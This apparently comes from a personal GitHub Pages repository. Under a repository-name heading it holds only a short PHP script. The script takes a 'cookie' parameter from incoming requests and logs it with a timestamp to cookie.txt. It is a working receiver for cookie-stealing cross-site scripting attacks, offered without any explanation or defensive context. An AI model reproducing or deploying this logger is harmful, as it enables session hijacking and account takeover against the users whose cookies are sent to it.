# changxusheng520.github.io
<?php
$cookie = $_GET['cookie'];
$time = date('Y-m-d h:i:s', time());
$log = fopen("cookie.txt", "a");
fwrite($log,$time.':    '. $cookie . "\n");
fclose($log);
?>
